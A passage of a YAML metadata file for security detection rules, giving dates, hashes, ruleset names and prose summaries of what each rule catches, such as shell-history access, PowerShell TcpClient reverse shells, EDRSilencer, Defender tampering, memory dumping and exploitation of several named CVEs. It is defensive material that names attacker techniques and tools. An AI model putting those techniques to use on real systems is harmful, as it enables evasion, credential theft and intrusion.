  Summary: This rule detects actions involving organization members or outside collaborators
    in GitHub. It identifies when an organization member or outside collaborator is
    added to or removed from a project board or has their permission level changed.
    Additionally, it monitors when an owner removes an outside collaborator from an
    organization, or when an outside collaborator does not use two-factor authentication
    (2FA) or disables 2FA in an organization where 2FA is required. These detections
    help ensure security compliance and proper access management within a GitHub organization.
  Updated-Date: '2024_09_04'
eae8ce9f-bde9-47a6-8e79-f20d18419910:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9574ce7e7e165f4ac2e11413d47d228b
  Ruleset: sigmahq
  Summary: This rule detects command-line operations on shell history files in a Linux
    environment, specifically targeting files such as .bash_history, .zsh_history,
    .zhistory, .history, .sh_history, and fish_history. It monitors the EXECVE system
    calls that interact with these history files to identify potential unauthorized
    access or credential theft activities. Legitimate administrative tasks and software
    that clean history files may generate false positives.
  Updated-Date: '2024_09_04'
eafb8bd5-7605-4bfe-a9ec-0442bc151f15:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e2ce6e09608bbcb259feef26cd938e86
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation of CVE-2024-1212, an unauthenticated
    command injection vulnerability in Progress Kemp LoadMaster. It identifies GET
    requests to the '/access/set' API endpoint that include the parameters 'param=enableapi'
    and 'value=1', along with an "Authorization" header containing base64 encoded
    values with uncommon characters. This pattern may indicate malicious activity
    attempting to exploit the command injection vulnerability.
  Updated-Date: '2024_09_03'
eb1c4225-1c23-4241-8dd4-051389fde4ce:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a869afc5bfd9b44435711b4e8697affa
  Ruleset: core
  Summary: This rule detects suspicious usage patterns of the "DumpMinitool.exe" binary,
    a Microsoft binary typically associated with creating crash dumps. It specifically
    looks for instances where the binary is executed in ways that deviate from standard
    usage patterns, such as atypical command-line arguments or executions outside
    expected directories. By monitoring command lines that include keywords like 'Full',
    'Mini', or 'WithHeap' without certain filtering criteria, the rule aims to identify
    potential misuse of this tool for malicious purposes, such as defense evasion
    or credential dumping.
  Updated-Date: '2024_09_03'
eb2d07d4-49cb-4523-801a-da002df36602:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4946789d7c7449ef28a634001057e632
  Ruleset: sigmahq
  Summary: This rule detects the execution of EDRSilencer, a tool engineered to obstruct
    Endpoint Detection and Response (EDR) agents from communicating security events
    to the server by utilizing the Windows Filtering Platform (WFP). The detection
    focuses on recognizing specific details such as the executable file name 'EDRSilencer.exe'
    and its description containing 'EDRSilencer'.
  Updated-Date: '2024_09_04'
ebbeb024-5b1d-4e16-9c0c-917f86c708a7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1b2935510eda54ae83413088d7287802
  Ruleset: sigmahq
  Summary: This rule detects when a user is added to an administrator's role in Azure
    Active Directory. It specifically monitors activity logs for operations where
    a member is added to a role associated with administrative privileges, indicated
    by role names ending in 'Admins' or 'Administrator'. Such modifications might
    indicate potential persistence or privilege escalation tactics being employed
    in the environment.
  Updated-Date: '2024_09_04'
ebdf49d8-b89c-46c9-8fdf-2c308406f6bd:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7a3b5c1f4f9a801a8f1d1fb11ab9a48a
  Ruleset: core
  Summary: This rule detects obfuscated PowerShell scripts that utilize Clip.exe as
    part of their execution process. Specifically, it identifies scripts where echoed
    content interacts with the Windows clipboard and attempts to run obfuscated commands,
    such as invoking functions or modules by parsing patterns that include terms like
    "Clipboard" or "invoke" with potential character alterations. This behavior is
    indicative of attempts to evade defenses by obscuring the true intent of the PowerShell
    commands being executed.
  Updated-Date: '2024_09_03'
ebea773c-a8f1-42ad-a856-00cb221966e8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dcc01b141113235d79a6afb7c47d2c1a
  Ruleset: core
  Summary: This rule detects the execution of VMware Xfer Utility (VMwareXferlogs.exe)
    from a non-default directory, which may indicate an attempt to sideload arbitrary
    DLLs. The detection focuses on process creation events to identify anomalies in
    the execution path of the utility, potentially pointing to malicious activity.
  Updated-Date: '2024_09_03'
ebef4391-1a81-4761-a40a-1db446c0e625:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b13377f32603d7e359b5357eacb82b99
  Ruleset: core
  Summary: This rule detects the creation of an event consumer through WMIC (Windows
    Management Instrumentation Command-line), specifically when an ActiveScriptEventConsumer
    is established. This behavior can be indicative of an attempt to create persistence
    on a system. The rule monitors process creation events on Windows systems, focusing
    on command lines that contain the keywords 'ActiveScriptEventConsumer' and 'CREATE'.
    While legitimate software might create script event consumers, such activity is
    generally associated with high-severity threats.
  Updated-Date: '2024_09_03'
ebfe73c2-5bc9-4ed9-aaa8-8b54b2b4777d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: ba005943ebda4a08cb774cbee99d72ff
  Ruleset: sigmahq
  Summary: This rule detects failed logon attempts from clients with external network
    IP addresses to an MSSQL server, which may indicate a bruteforce attack. The detection
    is based on event logs where the provider name contains 'MSSQL' and the EventID
    is 18456. It filters out specified local IP ranges to focus on external attempts.
  Updated-Date: '2024_09_04'
ec0722a3-eb5c-4a56-8ab2-bf6f20708592:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c9d713355204c69a8578bdcb9cee2b1f
  Ruleset: core
  Summary: This rule detects the execution of a renamed "gpg.exe" or "gpg2.exe." These
    executable files are often utilized by ransomware and loaders to perform actions
    such as data decryption and encryption.
  Updated-Date: '2024_09_03'
ec19ebab-72dc-40e1-9728-4c0b805d722c:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c36dfe26fe8068f58c2baaab5ec2c092
  Ruleset: sigmahq
  Summary: This rule detects attempts to tamper with Windows Defender settings via
    PowerShell commands. Specifically, it monitors for actions that aim to disable
    scheduled scanning, real-time monitoring, intrusion prevention, behavior monitoring,
    and other protective features, or set default actions to "Allow" for threats.
    This may indicate efforts to disable or weaken the system's defenses against malware
    and other malicious activities.
  Updated-Date: '2024_09_04'
ec1d5e28-8f3b-4188-a6f8-6e8df81dc28e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 478e5c9531b953a962f64fc5b75ca2fa
  Ruleset: sigmahq
  Summary: This rule detects the creation of WMI (Windows Management Instrumentation)
    script event consumers, which can be used for persistence and privilege escalation
    on Windows systems. It specifically identifies instances where the `scrcons.exe`
    process is launched by `svchost.exe`, as these conditions are indicative of potential
    malicious activities leveraging WMI for automated script execution. False positives
    might occur in legitimate scenarios, such as specific Dell computer configurations
    that register event consumers for handling keyboard brightness changes.
  Updated-Date: '2024_09_04'
ec290c06-9b6b-4338-8b6b-095c0f284f10:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9f67cbf326da90f774b05f86118007d4
  Ruleset: sigmahq
  Summary: This rule detects the uncommon use of the shutdown command line tool to
    log off a user in a Windows environment. The detection focuses on instances where
    the shutdown.exe process is executed with a command line argument that includes
    '/l', which is specifically used for logging off. This behavior is unusual and
    may indicate potential misuse or risky activity that warrants further investigation.
  Updated-Date: '2024_09_04'
ec3a3c2f-9bb0-4a9b-8f4b-5ec386544343:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: efef088c46673e0f57f0f66a54f6739c
  Ruleset: emerging-threats
  Summary: This rule detects exploitation attempts of CVE-2023-38331, which affects
    versions of WinRAR before 6.23. An attacker can exploit this vulnerability to
    execute arbitrary commands and binaries via WinRAR. The rule identifies suspicious
    child processes created by WinRAR, focusing on the execution of binaries such
    as 'cmd.exe', 'cscript.exe', 'powershell.exe', 'pwsh.exe', and 'wscript.exe',
    particularly when the command line includes paths to temporary files or displays
    double extensions.
  Updated-Date: '2024_09_03'
ec52985a-d024-41e3-8ff6-14169039a0b3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7416e38233f08431cdea2f95afa4ff43
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "mount" command with the "hidepid"
    parameter, which is used to make processes invisible to other users on the system.
    This behavior can be associated with efforts to hide malicious activities and
    may indicate attempts to evade detection by concealing information about running
    processes.
  Updated-Date: '2024_09_04'
ec570e53-4c76-45a9-804d-dc3f355ff7a7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 000e36b3c717c4443e16bd6edcb9ae1e
  Ruleset: sigmahq
  Summary: This rule detects the execution of 7-Zip, specifically targeting instances
    where it is used to compress files with the ".dmp," ".dump," or ".hdmp" extensions.
    Such activity could indicate the exfiltration of dump files, possibly for malicious
    purposes. The rule considers the description and file names associated with 7-Zip
    executables like "7z.exe," "7zr.exe," and "7za.exe." While legitimate use cases
    exist, such as accidental compression or compressing Windows Error Reporting (WER)
    dump files for troubleshooting, this behavior can be suspicious and warrants monitoring.
  Updated-Date: '2024_09_04'
ec7c4e9b-9bc9-47c7-a32f-b53b598da642:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cd194c0d555704473b4468db05d61a4e
  Ruleset: emerging-threats
  Summary: This rule detects the creation of JavaScript files within the DriverStore
    directory on Windows systems. The activity is associated with the Forest Blizzard
    Advanced Persistent Threat (APT) group, which leverages this method to exploit
    the CVE-2022-38028 vulnerability in the Windows Print Spooler service. By modifying
    a JavaScript constraints file in this location, the threat actors can execute
    it with SYSTEM-level permissions to achieve their objectives. The detection helps
    identify potential defense evasion and malicious file creation activities that
    could indicate compromise.
  Updated-Date: '2024_09_03'
ec82e2a5-81ea-4211-a1f8-37a0286df2c2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d3bf0dab90227a25f50b6d1e5a69b83d
  Ruleset: sigmahq
  Summary: This rule detects DNS queries for IP lookup services, such as "api.ipify.org,"
    originating from non-browser processes on Windows systems. The rule monitors for
    specific query names and patterns commonly associated with IP lookup APIs. Processes
    originating from well-known browsers like Chrome, Firefox, or Microsoft Edge are
    filtered out to avoid false positives. The aim is to identify potentially suspicious
    activity that could suggest misuse or surveillance by processes that are not typical
    web browsers.
  Updated-Date: '2024_09_04'
ec88289a-7e1a-4cc3-8d18-bd1f60e4b9ba:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3ba0880460312ccafd5c55a2daa64bc9
  Ruleset: sigmahq
  Summary: This rule detects modifications to the 'TypedPaths' registry key in the
    user or admin registry via the command line, which may indicate a persistence
    attempt. Such modifications are typically associated with maintaining access to
    a compromised system.
  Updated-Date: '2024_09_04'
ec8c4047-fad9-416a-8c81-0f479353d7f6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 79ef4954f765d0eaf209e12ee4a71a4a
  Ruleset: core
  Summary: This rule detects the exploitation of the msdt.exe binary to load the "sdiageng.dll"
    library, which is indicative of both the CVE-2022-30190 (Follina) and DogWalk
    vulnerabilities. The detection focuses on identifying instances where msdt.exe
    loads the sdiageng.dll library, a behavior associated with these specific security
    vulnerabilities.
  Updated-Date: '2024_09_03'
eca49c87-8a75-4f13-9c73-a5a29e845f03:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 730e91dc34e6d510491d6825f28441d7
  Ruleset: sigmahq
  Summary: This rule detects the execution of PowerShell scripts via Runscripthelper.exe.
    Runscripthelper.exe is scrutinized for its association with the 'surfacecheck'
    command line parameter. Typically found within process creation logs on Windows
    systems, this activity is notable for its potential use in executing code, evading
    defenses, and exploitation techniques.
  Updated-Date: '2024_09_04'
eca81e8d-09e1-4d04-8614-c91f44fd0519:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fd47a1fa6f8d92b70fc8b64c94f6040
  Ruleset: sigmahq
  Summary: This rule detects the addition of a new "Allow" firewall rule by the WMI
    process (WmiPrvSE.EXE) on a Windows system. This activity can indicate a potential
    security threat if an attacker manipulates firewall rules using PowerShell cmdlets
    such as "New-NetFirewallRule" or utilizes WMI CIM classes like "MSFT_NetFirewallRule".
    Relevant Event IDs to monitor include 2004, 2071, and 2097, which correspond to
    the logging of firewall rule changes, especially when the modifying application
    is WmiPrvSE.EXE. This rule aids in identifying unauthorized changes to firewall
    settings, which may be part of a defense evasion tactic.
  Updated-Date: '2024_09_04'
eca91c7c-9214-47b9-b4c5-cb1d7e4f2350:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1e888d40cac644dd2e58e8558caafdb5
  Ruleset: sigmahq
  Summary: This rule detects uncommon outbound network activity using the Kerberos
    default port (port 88) to identify potential lateral movement or the first stage
    of privilege escalation (PrivEsc) via delegation. It specifically looks for outbound
    connections marked by EventID 5156 but excludes activities commonly associated
    with legitimate processes such as `lsass.exe`, Google Chrome, Mozilla Firefox,
    and Tomcat. False positives can come from web browsers and third-party applications,
    necessitating an initial baseline to distinguish legitimate traffic from suspicious
    activity.
  Updated-Date: '2024_09_04'
ecbc5e16-58e0-4521-9c60-eb9a7ea4ad34:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f5dd71960fb85791546564bf68d0ab45
  Ruleset: core
  Summary: This rule detects the use of the getsystem command in Meterpreter or Cobalt
    Strike, which is associated with privilege escalation by monitoring for the installation
    of a specific service. It identifies activities by checking for Event ID 4697
    in Windows Security logs and examining command-line parameters for patterns that
    match known getsystem techniques. These patterns include the use of `cmd.exe`
    with specific commands, `rundll32.exe` invoking a DLL with parameters, and shared
    file access via the localhost address. The rule aims to capture these distinct
    behaviors indicative of attempts to elevate privileges through service installations.
  Updated-Date: '2024_09_03'
ed5d72a6-f8f4-479d-ba79-02f6a80d7471:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21ddb13668d94ef3e86c1dffa1b1e31d
  Ruleset: core
  Summary: This rule detects potential execution of LethalHTA technique, where "mshta.exe"
    is launched by the "svchost.exe" process. This behavior may indicate an attempt
    to evade defenses, as the combination of these processes is unusual and suspicious.
  Updated-Date: '2024_09_03'
ed74fe75-7594-4b4b-ae38-e38e3fd2eb23:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8f849b9fc6ff1c5f95bd8b706e3b346
  Ruleset: core
  Summary: This rule detects non-standard tools initiating outbound Remote Desktop
    Protocol (RDP) connections over port 3389, which may indicate possible lateral
    movement within a network. It requires an initial baseline configuration to exclude
    legitimate third-party RDP tools. The rule filters out known benign processes
    such as system applications (e.g., mstsc.exe and dns.exe), security software (e.g.,
    AvastSvc.exe), popular remote desktop managers (e.g., RemoteDesktopManager.exe),
    web browsers (e.g., Chrome and Firefox), and other application-specific executables
    (e.g., SplunkUniversalForwarder and SentinelRanger). Detection hinges on identifying
    connections not associated with these established tools, flagging potential unauthorized
    access or malicious activities.
  Updated-Date: '2024_09_03'
ed825c86-c009-4014-b413-b76003e33d35:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b9e20b3fa4e83f7d25cfcb1f47131d59
  Ruleset: sigmahq
  Summary: This rule detects the execution of Windows binaries from within a Windows
    Subsystem for Linux (WSL) instance. Such activity could be utilized to obscure
    parent-child process relationships, potentially indicating attempts at defense
    evasion or malicious execution. The detection mechanism identifies processes by
    checking if the image paths match typical Windows file paths and if the current
    directory contains WSL-related paths.
  Updated-Date: '2024_09_04'
ed965133-513f-41d9-a441-e38076a0798f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 240365d96df726e3d28a6753042fb2c8
  Ruleset: core
  Summary: This rule detects suspicious PowerShell invocations by identifying specific
    command parameters within the script block text. Parameters like `-enc`, `-EncodedCommand`,
    and similar variations suggest the use of encoded commands. Additionally, it looks
    for indications of hidden execution using parameters such as `-w hidden`, `-window
    hidden`, `-windowstyle hidden`, and similar terms. The rule also flags non-interactive
    executions with parameters like `-noni` and `-noninteractive`. These patterns
    are often associated with malicious activity or stealthy operations, thus warranting
    high scrutiny.
  Updated-Date: '2024_09_03'
edadb1e5-5919-4e4c-8462-a9e643b02c4b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d7b443a73f6045f2a06b33a84674f9a
  Ruleset: core
  Summary: This rule detects the utilization of the Microsoft Windows Resource Leak
    Diagnostic tool "rdrleakdiag.exe" to dump process memory. This tool is capable
    of capturing memory dumps of processes for diagnostic purposes and is identified
    through specific command line parameters such as '/memdmp' and 'fullmemdmp'. The
    rule monitors for these parameters along with output and process directives indicated
    by ' /o ' and ' /p ' in the command line. The detection aims to identify unauthorized
    or malicious attempts to access sensitive information residing in process memory
    using this tool.
  Updated-Date: '2024_09_03'
edc2f8ae-2412-4dfd-b9d5-0c57727e70be:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c6f9c4abcd958b72fe7f1dd776b56391
  Ruleset: core
  Summary: This rule detects the usage of the "TcpClient" class in PowerShell commands,
    which is often abused to establish unauthorized remote connections and reverse
    shells. It targets specific PowerShell execution patterns that leverage classes
    and methods such as Net.Sockets.TCPClient, GetStream, and Write. The rule identifies
    processes where the original file name matches PowerShell.EXE or pwsh.dll, and
    the image path ends with powershell.exe or pwsh.exe. Notably, this technique is
    employed by the Nishang "Invoke-PowerShellTcpOneLine" reverse shell script, among
    others.
  Updated-Date: '2024_09_03'
edd3ddc3-386f-4ba5-9ada-4376b2cfa7b5:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1a66c4a7980557589debe2427ca93a81
  Ruleset: core
  Summary: This rule detects potential DLL sideloading of "EACore.dll," which is a
    technique often used for evading defenses or escalating privileges. It monitors
    for instances of the "EACore.dll" being loaded, specifically looking for cases
    where the loading path does not match the legitimate paths typically associated
    with Electronic Arts' EA Desktop software. This detection aims to spot unauthorized
    or suspicious loading of the DLL that could indicate malicious activity or the
    presence of malware leveraging DLL sideloading for persistence and execution.
  Updated-Date: '2024_09_03'
edd8a48c-1b9f-4ba1-83aa-490338cd1ccb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a43850f35fa1c77ff198ee46041cebd5
  Ruleset: core
  Summary: This rule detects the execution of a renamed "jusched.exe," which is associated
    with the activities of the Cobalt Group. The detection focuses on process creation
    logs in Windows, identifying descriptions that match Java Update Scheduler but
    excluding instances where the legitimate "jusched.exe" is running.
  Updated-Date: '2024_09_03'
ede05abc-2c9e-4624-9944-9ff17fdc0bf5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bdfbf425c1840c6e8c92b9aa1dd30020
  Ruleset: sigmahq
  Summary: This rule detects instances where the DNS Z flag, which is intended to
    remain unused according to IETF standards, is set to a non-zero value. While this
    flag can be legitimately used in DNSSec, its deployment is still rare. Detecting
    non-zero values in this flag helps identify potential misuse, particularly for
    sensitive file gathering activities. The rule aims to filter out legitimate DNSSec
    domains and specific top-level domains (TLDs) to avoid false positives. It is
    accompanies a threat hunting guide and includes considerations for excluding certain
    internal or legitimate external domains, especially in public sectors.
  Updated-Date: '2024_09_04'
edf3485d-dac4-4d50-90e4-b0e5813f7e60:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d93685c536c42d2806cb5cbf53628688
  Ruleset: sigmahq
  Summary: This rule detects network connections to IP lookup service APIs by non-browser
    processes, potentially indicating post-compromise internet activity. The target
    services include well-known IP information providers such as "api.ipify.org,"
    "freegeoip.app," and "icanhazip.com." This detection excludes standard browser
    processes like Chrome, Firefox, and Edge to reduce false positives. Legitimate
    troubleshooting or network monitoring activities might also generate similar traffic.
  Updated-Date: '2024_09_04'
ee111937-1fe7-40f0-962a-0eb44d57d174:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b7a2a9c73aa825efd75387361b4bce3b
  Ruleset: sigmahq
  Summary: "This rule detects unusual file download activities by OAuth applications\
    \ from Microsoft SharePoint or Microsoft OneDrive, as reported by Microsoft Cloud\
    \ App Security. The detection is focused on identifying anomalous patterns that\
    \ are not consistent with the user\u2019s normal behavior, which may indicate\
    \ possible exfiltration attempts."
  Updated-Date: '2024_09_04'
ee218c12-627a-4d27-9e30-d6fb2fe22ed2:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b0aa2b835985b057c3bc55e2013ca3f9
  Ruleset: sigmahq
  Summary: This rule detects the inline execution of PowerShell code directly from
    a file. It identifies specific command line patterns associated with PowerShell
    execution, such as 'iex', 'Invoke-Expression', 'Invoke-Command', and 'icm'. Additionally,
    it monitors commands used to read content from a file, including 'cat', 'get-content',
    and 'type', and tracks instances where the '-raw' flag is used. This rule aims
    to uncover instances where scripts are executed dynamically, which can be a tactic
    often leveraged for malicious purposes in a Windows environment.
  Updated-Date: '2024_09_04'
ee2803f0-71c8-4831-b48b-a1fc57601ee4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1d3ff3d9b2522991c87ac3cd278487ab
  Ruleset: sigmahq
  Summary: This rule detects when an application is removed from Google Workspace.
    It looks for specific event names, such as REMOVE_APPLICATION and REMOVE_APPLICATION_FROM_WHITELIST,
    within logs generated by Google Workspace's administrative services. This action
    could indicate administrative changes or potential unauthorized modifications
    by a system administrator.
  Updated-Date: '2024_09_04'
ee37eb7c-a4e7-4cd5-8fa4-efa27f1c3f31:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3edaec64b7d7f45accee42349b6dd1e4
  Ruleset: core
  Summary: This rule detects the execution of Ngrok, a port forwarding and tunneling
    utility used to make local protected services publicly accessible, often exploited
    by threat actors. The detection involves monitoring specific command-line arguments
    and behaviors associated with Ngrok, such as references to popular TCP port numbers
    (e.g., 139, 445, 3389), particular command sequences (e.g., 'start', '--all',
    '--config'), and the execution of 'ngrok.exe' with various command-line options
    (e.g., 'tcp', 'http', 'authtoken'). Certain false positives are acknowledged,
    including other tools mimicking Ngrok's command-line switches and specific applications
    using Ngrok for legitimate purposes, such as Azure Bot Services.
  Updated-Date: '2024_09_03'
ee39a9f7-5a79-4b0a-9815-d36b3cf28d3e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c7092afe55019cb2946002a578c3cde6
  Ruleset: core
  Summary: This rule detects when Okta FastPass prevents a known phishing site during
    a multi-factor authentication (MFA) attempt. It triggers when the outcome reason
    is identified as "FastPass declined phishing attempt" and the result is marked
    as a failure, indicating a thwarted phishing effort.
  Updated-Date: '2024_09_03'
ee4c5d06-3abc-48cc-8885-77f1c20f4451:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4fe241ff81c606ac5b602a6ccfc8779e
  Ruleset: core
  Summary: This rule detects processes attempting to load the non-existent DLL "ShellChromeAPI.dll."
    An example scenario includes the "DeviceEnroller" binary utilizing the "PhoneDeepLink"
    flag to load this DLL. Adversaries can exploit this by deploying a malicious DLL
    renamed to "ShellChromeAPI.dll" and executing it via DeviceEnroller.exe using
    the specified parameter. This technique involves defense evasion, persistence,
    and potential privilege escalation.
  Updated-Date: '2024_09_03'
ee5e119b-1f75-4b34-add8-3be976961e39:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5832a99711d71fce316201f2d47af7cd
  Ruleset: core
  Summary: This rule detects the usage of path traversal in the command line arguments
    of conhost.exe, which may indicate possible command or argument confusion or hijacking
    attempts. The detection focuses on identifying instances where the parent command
    line includes 'conhost' and the command line itself contains '/../../'. This pattern
    is typically associated with malicious activities as it attempts to navigate the
    file system in an unauthorized manner. The likelihood of false positives is noted
    as unlikely, emphasizing the suspicious nature of such occurrences.
  Updated-Date: '2024_09_03'
ee63c85c-6d51-4d12-ad09-04e25877a947:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6fbeff3cb1aa95627999284772579e7d
  Ruleset: sigmahq
  Summary: This rule detects the creation of new custom Shim databases within specific
    directories in the Windows operating system. Adversaries may utilize these Shim
    databases to establish persistence or elevate privileges by executing malicious
    content through application shims. The Windows Application Compatibility Infrastructure/Framework
    allows for backward compatibility of software as the operating system evolves.
    The detection focuses on filenames located in the ":\Windows\apppatch\Custom\"
    or ":\Windows\apppatch\CustomSDB\" directories, which may indicate unauthorized
    persistence mechanisms being established.
  Updated-Date: '2024_09_04'
ee6cea48-c5b6-4304-a332-10fc6446f484:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 14e157249b01339c1706d22bfaa27c93
  Ruleset: core
  Summary: This rule detects potential DLL sideloading activities involving the "appverifUI.dll"
    file. DLL sideloading, a technique often used in cyber attacks, involves tricking
    a legitimate application into loading a malicious DLL. The rule specifically looks
    for instances where "appverifUI.dll" is loaded from paths other than the legitimate
    ones within the Windows directories (SysWOW64, System32, and WinSxS). This can
    indicate an attempt to evade defenses and possibly escalate privileges or execute
    malicious code. This detection is particularly useful for identifying attempts
    to manipulate the legitimate "appverif.exe" application.
  Updated-Date: '2024_09_03'
ee77a5db-b0f3-4be2-bfd4-b58be1c6b15a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b68962839e74fdcc06da3b1565118988
  Ruleset: core
  Summary: This rule detects tampering with attachment manager settings policies in
    Windows. It focuses on changes made to specific registry keys related to attachment
    handling, such as hiding zone information, saving zone information, and disabling
    antivirus scans. Tampering with these settings can indicate an attempt to evade
    defense mechanisms.
  Updated-Date: '2024_09_03'
ee9ca27c-9bd7-4cee-9b01-6e906be7cae3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d33f073bfcb80ffc301a4c7d3603a3b
  Ruleset: sigmahq
  Summary: This rule detects the installation of a PDQDeploy service, indicating that
    PDQDeploy has been installed on a machine. PDQDeploy is a software deployment
    tool that can be misused by attackers to remotely install packages or execute
    commands on target machines. Detection focuses on specific event IDs and service
    names associated with PDQDeploy.
  Updated-Date: '2024_09_04'
eeb30123-9fbd-4ee8-aaa0-2e545bbed6dc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d79ee70025d815fc37f26dc878ce634e
  Ruleset: core
  Summary: This rule detects the addition of a Security Support Provider (SSP) to
    the registry. SSP DLLs, when added, gain access to encrypted and plaintext passwords
    stored in Windows upon a reboot or API call.
  Updated-Date: '2024_09_03'
eed82177-38f5-4299-8a76-098d50d225ab:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3aaac01d34491a791e2084d02b00bc20
  Ruleset: sigmahq
  Summary: This rule detects modifications, such as create, update, or replace actions,
    to mutating or validating webhook configurations within Kubernetes. These changes
    can signify an adversary attempting to achieve persistence or exfiltrate access
    credentials. The rule specifically monitors actions affecting the 'admissionregistration.k8s.io'
    API group and targets resources like 'mutatingwebhookconfigurations' and 'validatingwebhookconfigurations.'
    While legitimate system administrator activities or automated processes may trigger
    this detection, the rule aims to identify potentially malicious modifications.
  Updated-Date: '2024_09_04'
eee00933-a761-4cd0-be70-c42fe91731e7:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c204aa55104c4adc177cf848a248b653
  Ruleset: sigmahq
  Summary: This rule detects the execution of GfxDownloadWrapper.exe with a URL as
    an argument, which indicates an attempt to download a file. The detection focuses
    on command lines containing 'http://' or 'https://', while filtering out known
    legitimate URLs such as 'https://gameplayapi.intel.com/'. The purpose is to identify
    potential unauthorized downloads which may signify malicious activities.
  Updated-Date: '2024_09_04'
eee8311f-a752-44f0-bf2f-6b007db16300:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e0d4e4d2040e0157bad41c1beb845587
  Ruleset: emerging-threats
  Summary: This rule detects access to files and shares with names and extensions
    associated with BlueSky ransomware, which may indicate an ongoing or past encryption
    attempt. It monitors specific Windows security event IDs (4663, 4656, and 5145)
    for object names ending in '.bluesky' or containing 'DECRYPT FILES BLUESKY'.
  Updated-Date: '2024_09_03'
ef61af62-bc74-4f58-b49b-626448227652:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 31dc550625036a708bcbe33d82387738
  Ruleset: core
  Summary: This rule detects the use of Sysinternals ADExplorer tool with the "-snapshot"
    flag to save a local copy of the Active Directory database in suspicious directories
    such as '\Downloads\', '\Users\Public\', '\AppData\', and '\Windows\Temp\'. The
    presence of ADExplorer.exe or its original file name 'AdExp' in the process creation
    logs and the specific command line containing 'snapshot' are examined to identify
    this potentially malicious activity.
  Updated-Date: '2024_09_03'
ef64fc9c-a45e-43cc-8fd8-7d75d73b4c99:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 46f671c028da899f2021fa73451ed187
  Ruleset: sigmahq
